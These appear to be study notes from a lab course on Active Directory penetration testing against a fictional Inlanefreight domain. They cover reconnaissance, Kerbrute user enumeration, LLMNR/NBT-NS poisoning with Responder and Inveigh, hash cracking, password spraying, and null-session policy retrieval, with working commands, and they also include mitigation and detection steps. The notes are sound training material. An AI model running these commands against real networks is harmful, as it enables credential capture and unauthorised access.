# External Recon and Enumeration Principles

#### Purpose of External Reconnaissance:
1. **Validation:** Confirm scoping document information, ensuring accurate alignment with the client's target.
2. **Scope Assurance:** Avoid unintended interactions with systems outside the authorized scope.
3. **Information Gathering:** Identify publicly available data that could facilitate the penetration test, like leaked credentials or infrastructure details.

---

### What to Look For:

| **Data Point**      | **Description**                                                                                                   |
|----------------------|-------------------------------------------------------------------------------------------------------------------|
| **IP Space**         | Identifying ASN, netblocks, DNS entries, and cloud infrastructure.                                               |
| **Domain Information** | Subdomains, domain services, defenses like SIEM, AV, and IPS/IDS.                                               |
| **Schema Format**    | Email/AD username conventions and password policies for attacks like password spraying or credential stuffing.    |
| **Data Disclosures** | Metadata in public documents, links to intranet, or credentials in repositories like GitHub.                     |
| **Breach Data**      | Publicly leaked usernames, passwords, or hashes for unauthorized access to services.                             |

---

### Where to Look:

| **Resource**              | **Examples**                                                                                               |
|---------------------------|-----------------------------------------------------------------------------------------------------------|
| **ASN/IP Registrars**      | IANA, ARIN, RIPE, BGP Toolkit for IP/ASN research.                                                        |
| **Domain/DNS Records**     | Domaintools, PTRArchive, ICANN, and manual DNS queries to find subdomains and validate information.        |
| **Social Media**           | LinkedIn, Twitter, Facebook for organizational details, user roles, or infrastructure clues.              |
| **Public Websites**        | Check the "About Us" and "Contact Us" pages for embedded documents, emails, and organizational charts.     |
| **Cloud & Dev Repos**      | GitHub, AWS S3 buckets, and Google Dorks for accidentally exposed credentials or sensitive files.          |
| **Breach Sources**         | HaveIBeenPwned, Dehashed to find corporate emails, plaintext passwords, or hashes in breach databases.     |

---

### Steps and Tools:

1. **Finding Address Spaces:**  
   - Use BGP Toolkit or similar to identify ASN/IP ranges tied to the target.
   - Validate addresses with tools like
     ```
     nslookup
     ```
     and online DNS services (e.g., viewdns.info ,https://bgp.he.net/ ,https://research.domaintools.com/ ). 

2. **Hunting Documents and Emails:**  
   - **Search:** Use Google Dorks like
     ```
     filetype:pdf inurl:target.com
     ```
     or
     ```
     intext:"@target.com"
     ```
     to find sensitive files and email addresses.
   - **Save Locally:** Keep all findings organized for deeper inspection.

3. **Username Harvesting:**  
   - Tools like `linkedin2username` can generate potential username formats based on public employee data.

4. **Credential Hunting:**  
   - Search breach databases (e.g., Dehashed) to find leaked credentials for external-facing services.  
   - **Example Dork:**
     ```
     sudo python3 dehashed.py -q inlanefreight.local -p
     ```
     

---

### Key Enumeration Principles:

1. **Passive to Active Approach:** Begin with passive recon (no direct engagement) and gradually move to active enumeration once you identify potential targets.
2. **Iterative Process:** Continuously revisit and refine findings based on new data.
3. **Validate Results:** Cross-check data from multiple sources for consistency and accuracy.
4. **Stay In Scope:** Always ensure your actions are authorized and documented.

This methodology ensures thorough preparation and minimizes the risk of errors during penetration testing. Let me know if you'd like more specific examples or a focus on tools for automation!

# Initial Enumeration of the Domain
![image](https://github.com/user-attachments/assets/b35654f9-5fa7-4dba-8cbf-c916eb17b67b)


---


#### Setting Up
For this penetration test, we are starting on an attack host within the internal network of Inlanefreight. The customer has provided a **custom pentest VM** connected to their internal network, and we are to perform non-evasive testing starting from an unauthenticated standpoint with a **standard domain user account (htb-student)**.

---

#### Tasks:
1. **Enumerate the internal network** to identify hosts, services, and potential vulnerabilities.
2. Perform **passive enumeration** first (using tools like Wireshark and Responder), followed by **active checks** (using tools like `fping` and Nmap).
3. **Document findings** for later use, including details on:
   - AD Users
   - AD Joined Computers (Domain Controllers, file servers, etc.)
   - Key Services (Kerberos, NetBIOS, LDAP, DNS)
   - Vulnerable Hosts and Services

---

### 1. Identifying Hosts (Passive Enumeration)

#### **Wireshark Capture**
To capture network traffic and identify hosts, start by running Wireshark on the attack host.

```bash
sudo -E wireshark
```

*Wireshark output shows ARP requests and MDNS broadcasts, revealing the following hosts:*
- `172.16.5.5`
- `172.16.5.25`
- `172.16.5.50`
- `172.16.5.100`
- `172.16.5.125`

---

#### **Tcpdump Capture**
If you are on a host without a GUI, you can use `tcpdump` to capture network traffic and save it to a `.pcap` file for later analysis with Wireshark.

```bash
sudo tcpdump -i ens224
```

---

#### **Responder Analysis**
Responder can be used in passive mode to listen for LLMNR, NBT-NS, and MDNS requests, identifying additional hosts.

```bash
sudo responder -I ens224 -A
```

*Responder output reveals:*
- New hosts: `172.16.5.200`, `172.16.5.225`, `ACADEMY-EA-WEB01`

---

### 2. Active Enumeration of Hosts

#### **FPing ICMP Sweep**
To check for active hosts in the `172.16.5.0/23` range, use `fping` to perform an ICMP sweep.

```bash
fping -asgq 172.16.5.0/23
```

*Results show 9 live hosts including the attack host.*

---

### 3. Nmap Scan of Active Hosts

With the list of live hosts, use Nmap for detailed service enumeration, targeting protocols like DNS, LDAP, SMB, and Kerberos.

```bash
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

*Nmap scan reveals services on `172.16.5.5`:*
- **53/tcp**: Simple DNS Plus
- **88/tcp**: Kerberos
- **389/tcp**: LDAP (Active Directory)
- **445/tcp**: Microsoft-DS
- **636/tcp**: SSL/LDAP

---

### 4. Key Data Points Collected:
- **AD Users**: To target for password spraying or further enumeration.
- **AD Computers**: Identifying key systems like domain controllers.
- **Key Services**: Identified Kerberos, LDAP, DNS, SMB services.
- **Vulnerable Hosts**: Noticed open ports and services that might be exploitable.

--- 
## Identifying Users for Internal Penetration Testing

When no user is provided to start testing with, the goal is to establish a foothold in the domain using various techniques. The most common methods for obtaining access are:

- **Clear text credentials or NTLM password hashes** for a valid user.
- **SYSTEM shell** on a domain-joined host.
- **Shell in the context of a domain user account.**

### Initial Steps for User Enumeration

1. **Kerbrute for Kerberos Pre-authentication Failure**  
   Kerbrute is a stealthy tool used for enumerating domain accounts by exploiting Kerberos pre-authentication failures. Since these failures often do not trigger logs or alerts, it’s a useful tool for attacking from an unauthenticated perspective.

#### Setting up Kerbrute
- **Clone the Kerbrute GitHub repo**:
  ```bash
  sudo git clone https://github.com/ropnop/kerbrute.git
  ```

- **Compile the binaries for the platform** (e.g., Linux):
  ```bash
  cd kerbrute
  make all
  ```

- **Check compiled binaries**:
  ```bash
  ls dist/
  ```

- **Move the binary to a local directory for easier access**:
  ```bash
  sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
  ```

#### Testing Kerbrute:
```bash
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```
- This command uses **Kerbrute** with a user list (`jsmith.txt`) to enumerate valid users in the domain `INLANEFREIGHT.LOCAL` using the domain controller at `172.16.5.5`. The results are saved to the `valid_ad_users` file.

### Example Output:
- The output will list valid usernames such as:
  ```
  [+] VALID USERNAME: jjones@INLANEFREIGHT.LOCAL
  [+] VALID USERNAME: sbrown@INLANEFREIGHT.LOCAL
  [+] VALID USERNAME: tjohnson@INLANEFREIGHT.LOCAL
  ```

### SYSTEM Access
- The **SYSTEM account** (NT AUTHORITY\SYSTEM) is a built-in Windows account with the highest privilege level.
- SYSTEM access allows enumeration of Active Directory, Kerberoasting, ASREPRoasting, and other powerful attacks like SMB relay or ACL attacks.

#### Ways to gain SYSTEM access:
- **Remote Windows exploits** like MS08-067, EternalBlue, BlueKeep.
- **Abusing services** running in the context of SYSTEM (e.g., Juicy Potato on older systems).
- **Local privilege escalation** through flaws such as Windows 10 Task Scheduler vulnerabilities.
- **Using Psexec to run SYSTEM-level commands** after gaining admin access.

#### Post-SYSTEM Access Actions:
- Enumerate the domain using tools like **BloodHound** or **PowerView**.
- Run attacks like **Kerberoasting** or **ASREPRoasting**.
- Harvest **Net-NTLMv2 hashes** or perform **SMB relay** attacks using tools like **Inveigh**.
- **Token impersonation** for privilege escalation.
- **ACL attacks** to manipulate permissions.

### Considerations for Stealth
- **Non-evasive tests**: Higher noise and less concern for stealth.
- **Evasive or red team engagements**: Stealth is critical. Using tools like **Nmap** or other noisy tools may trigger alerts. Always clarify the assessment's goals with the client.

Sure thing! Here is a more detailed version, including commands and additional information:

---

# LLMNR/NBT-NS Poisoning from Linux

### Overview
- **Goal:** Acquire valid cleartext credentials for a domain user account.
- **Techniques:** Network poisoning and password spraying.
- **Tools:** Responder and Inveigh.

### LLMNR & NBT-NS Primer
- **LLMNR:** Uses port 5355 over UDP, for name resolution if DNS fails.
- **NBT-NS:** Uses port 137 over UDP, as a fallback if LLMNR fails.
- **Vulnerability:** Any host on the network can respond to LLMNR/NBT-NS queries, allowing for a Man-in-the-Middle attack.

### Attack Flow
1. Host attempts connection to a non-existent server.
2. DNS fails to resolve the host.
3. Host broadcasts request on local network.
4. Attacker (with Responder) responds, posing as the requested host.
5. Host sends authentication request to attacker.
6. Attacker captures the NTLMv2 password hash.

### Tools for LLMNR/NBT-NS Poisoning
- **Responder:** 
  - A tool for poisoning LLMNR, NBT-NS, and MDNS requests.
  - Can capture hashes and store them in log files.
- **Inveigh:** 
  - Cross-platform MITM tool for spoofing and poisoning attacks.
  - Written in C# and PowerShell.
- **Metasploit:** 
  - Has modules for spoofing and poisoning attacks.

### Using Responder
- **Install Responder:**
  ```bash
  sudo apt-get install responder
  ```
- **Run Responder with default settings:**
  ```bash
  sudo responder -I <network_interface>
  ```
  Replace `<network_interface>` with your actual network interface, e.g., `ens224`.
- **Common options:**
  - `-A`: Analyze mode, sees requests without poisoning.
  - `-w`: Start WPAD rogue proxy server.
  - `-f`: Fingerprint remote host OS and version.
  - `-v`: Increased verbosity.
  - `-F`: Force NTLM or Basic authentication.
  - `-P`: Force proxy authentication.
- **Example Command:**
  ```bash
  sudo responder -I ens224 -wf
  ```

### Ports to Ensure Availability
- **UDP:** 137, 138, 53, 1434, 5355, 5353
- **TCP:** 80, 135, 139, 445, 21, 25, 110, 587, 3128, 3141, 1433, 389

### Configuration File
- **Location:** `/usr/share/responder/Responder.conf`
- **Adjustments:** Disable rogue servers and setup logging as needed.

### Responder Logs
- **Log files:** Stored in `/usr/share/responder/logs` with format `MODULE_NAME-HASH_TYPE-CLIENT_IP.txt`
  ```bash
  ls /usr/share/responder/logs
  ```
  Example:
  ```bash
  SMB-NTLMv2-SSP-172.16.5.25.txt
  ```

### Capturing with Responder
1. **Start Responder in a tmux window:**
   ```bash
   tmux
   sudo responder -I ens224
   ```
2. **Crack captured hashes using Hashcat:**
   ```bash
   hashcat -m 5600 <hash_file> <wordlist>
   ```
   Replace `<hash_file>` with the path to your hash file and `<wordlist>` with the path to your wordlist.

### TTPs
- **Objective:** Collect authentication information (NTLMv1/NTLMv2 password hashes).
- **Cracking Hashes:** Use tools like Hashcat or John to crack the hashes offline.
- **Further Use:** Utilize cleartext passwords for initial foothold or expanded access within the domain.

---
# LLMNR/NBT-NS Poisoning - from Windows
### Overview
Inveigh is a tool written in PowerShell and C# that can listen to multiple protocols, including LLMNR, DNS, mDNS, NBNS, and more. It's useful for capturing credentials on Windows hosts.

### Using the PowerShell Version

1. **Import the module and list parameters:**
   ```powershell
   PS C:\htb> Import-Module .\Inveigh.ps1
   PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
   ```

2. **Start Inveigh with LLMNR and NBNS spoofing:**
   ```powershell
   PS C:\htb> Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
   ```

### Using the C# Version (InveighZero)
The C# version is actively maintained and combines original and ported code. It's available pre-compiled in the C:\Tools folder, but it's good practice to compile it yourself using Visual Studio.

1. **Run the C# executable:**
   ```powershell
   PS C:\htb> .\Inveigh.exe
   ```

2. **View help options:**
   ```
   C(0:0) NTLMv1(0:0) NTLMv2(3:9)> HELP
   ```

### Useful Console Commands

- **Get queued console output:**
  ```plaintext
  GET CONSOLE
  ```

- **Get captured NTLMv2 hashes (unique):**
  ```plaintext
  GET NTLMV2UNIQUE
  ```

- **Get captured NTLMv2 usernames:**
  ```plaintext
  GET NTLMV2USERNAMES
  ```

### Example Output

#### Unique NTLMv2 Hashes
```plaintext
backupagent::INLANEFREIGHT:B5013246091943D7:...
forend::INLANEFREIGHT:32FD89BD78804B04:...
...
```

#### NTLMv2 Usernames
```plaintext
IP Address    Host            Username                     Challenge
172.16.5.125  ACADEMY-EA-FILE  INLANEFREIGHT\backupagent    B5013246091943D7
172.16.5.125  ACADEMY-EA-FILE  INLANEFREIGHT\forend         32FD89BD78804B04
...
```

---

## Remediation

### Mitre ATT&CK Reference
- **ID:** T1557.001
- **Technique:** Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

### Mitigation Steps
To prevent LLMNR and NBT-NS spoofing attacks, it's crucial to disable these protocols cautiously after testing their impact on your network.

1. **Disable LLMNR via Group Policy:**
   - Navigate to: `Computer Configuration --> Administrative Templates --> Network --> DNS Client`
   - Enable: **Turn OFF Multicast Name Resolution**

2. **Disable NBT-NS Locally:**
   - Open **Network and Sharing Center** under **Control Panel**
   - Click **Change adapter settings**
   - Right-click on the adapter, view properties
   - Select **Internet Protocol Version 4 (TCP/IPv4)**
   - Click **Properties** -> **Advanced** -> **WINS** tab
   - Select **Disable NetBIOS over TCP/IP**

3. **Disable NBT-NS via PowerShell Script:**
   - Script to disable NetBIOS:
     ```powershell
     $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
     Get-ChildItem $regkey | foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose }
     ```
   - Add the script to **Startup** in Local Group Policy:
     - Navigate to: `Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup`
     - Add the PowerShell script

4. **Push Out GPO Script Domain-Wide:**
   - Create a GPO using **Group Policy Management**
   - Host the script on the **SYSVOL** share and call it via UNC path:
     ```
     \\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts
     ```
   - Apply GPO to specific OUs and ensure the script runs on reboot

5. **Additional Mitigations:**
   - Filter network traffic to block LLMNR/NetBIOS
   - Enable SMB Signing to prevent NTLM relay attacks
   - Use network intrusion detection/prevention systems
   - Implement network segmentation

## Detection

### Detecting Attack Behavior
1. **Inject LLMNR and NBT-NS Requests:**
   - Inject requests for non-existent hosts across subnets
   - Alert if any responses are received

2. **Monitor Network Traffic:**
   - Ports: UDP 5355 (LLMNR) and UDP 137 (NetBIOS)

3. **Monitor Event IDs:**
   - Event ID 4697
   - Event ID 7045

4. **Monitor Registry Key:**
   - Registry: `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient`
   - DWORD value `EnableMulticast`, where `0` indicates LLMNR is disabled

---
# Password Spraying Overview

**Password spraying** is trying a common password with a list of usernames to gain access without triggering account lockouts.

#### Key Points:
- **Method:** Use one common password across many usernames.
- **Purpose:** Gain initial access or a foothold in a network.
- **Precaution:** Introduce delays to avoid account lockouts.

### Scenarios

1. **Example 1:**
   - **Method:** Combined GitHub and LinkedIn username lists.
   - **Tool:** Kerbrute.
   - **Outcome:** Gained low-privileged access, then escalated using `BloodHound`.

2. **Example 2:**
   - **Method:** Scraped PDF metadata for username patterns.
   - **Outcome:** Enumerated all domain users, gained passwords, and compromised the domain.

### Considerations

- **Risk of Lockouts:** Avoid frequent attempts to prevent account lockouts.
- **Internal Use:** Use for lateral movement within a network.
- **Password Policy:** Know the domain's policy to minimize risks.

### Practical Tips:

- **Delays:** Wait hours between attempts.
- **Client Communication:** Clarify password policies.
- **Enumeration:** Use provided accounts to discover password policies.

# Enumerating & Retrieving Password Policies

In various IT security scenarios, enumerating and retrieving password policies are essential steps to understand and secure the domain environment. This process can vary depending on whether you have valid credentials or are attempting to access information without authentication.

#### 1. **Credentialed Enumeration from Linux:**

With valid domain credentials, you can retrieve the domain password policy remotely using tools like CrackMapExec or rpcclient.

- **Tools:** CrackMapExec, rpcclient
- **Command Example:**
  ```sh
   crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
  ```

#### 2. **SMB NULL Sessions (Unauthenticated):**

SMB NULL sessions are a misconfiguration that allows unauthenticated attackers to access information about the domain, including user lists, groups, computers, and the password policy. This often occurs due to legacy Domain Controllers being upgraded, bringing along insecure configurations from older Windows Server versions.

- **Misconfiguration:** Often result from upgrading legacy Domain Controllers.
- **Tools:** enum4linux, CrackMapExec, rpcclient
- **Command Example:**
  ```sh
  $ rpcclient -U "" -N 172.16.5.5
  rpcclient $> querydominfo
  rpcclient $> getdompwinfo
  ```

#### 3. **Using enum4linux:**

enum4linux is a tool built around the Samba suite of tools used for enumeration of Windows hosts and domains.

- **Original Tool:**
  ```sh
    enum4linux -P 172.16.5.5
  ```
- **Updated Tool (enum4linux-ng):**
  ```sh
   enum4linux-ng -P 172.16.5.5 -oA ilfreight
  ```

**Command Example for JSON/YAML output:**
  ```sh
   cat ilfreight.json
  ```

#### 4. **Null Session from Windows:**

Although less common, null sessions can also be performed from Windows using specific commands.

- **Command Example:**
  ```sh
   net use \\DC01\ipc$ "" /u:""
  ```

- **Common Errors:**
  - **Account is Disabled:**
    ```sh
    C:\htb> net use \\DC01\ipc$ "" /u:guest
    System error 1331 has occurred.
    ```
  - **Password is Incorrect:**
    ```sh
    C:\htb> net use \\DC01\ipc$ "password" /u:guest
    System error 1326 has occurred.
    ```
  - **Account is Locked Out:**
    ```sh
    C:\htb> net use \\DC01\ipc$ "password" /u:guest
    System error 1909 has occurred.
    ```

#### 5. **LDAP Anonymous Bind (Unauthenticated):**

LDAP anonymous binds allow unauthenticated attackers to retrieve domain information. This legacy configuration can sometimes still be found, exposing sensitive information.

- **Tools:** windapsearch.py, ldapsearch, ad-ldapdomaindump.py
- **Command Example:**
  ```sh
  ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
  ```

#### 6. **Built-in Windows Commands (Authenticated):**

If you can authenticate to the domain, built-in Windows tools or third-party tools can be used to retrieve the password policy.

- **Tools:** net.exe, PowerView, CrackMapExec (Windows), SharpMapExec, SharpView

Using built-in commands is particularly useful if you land on a Windows system and cannot transfer additional tools to it.

### Analyzing the Password Policy

**From net accounts command:**
```sh
net accounts

```

**Key Points:**
- **Passwords never expire:** Maximum password age set to Unlimited.
- **Minimum password length:** 8.
- **Lockout threshold:** 5 wrong passwords.
- **Lockout duration:** 30 minutes.
- **Password spraying:** Effective due to the eight-character minimum and auto-unlock feature.

#### Using PowerView

**Command Example:**
```powershell
 import-module .\PowerView.ps1
 Get-DomainPolicy

```

**Key Points:**
- **Minimum password length:** 8.
- **Password complexity:** Enabled (PasswordComplexity=1). meaning that a user must choose a password with 3/4 of the following: an uppercase letter, lowercase letter, number, special character
- **Lockout threshold:** 5.
- **Lockout duration:** 30 minutes.
- **Password history size:** 24.

if password policy is not retrieved rule of thumb is max tries is 3-5 and make sure not to lockout accounts.
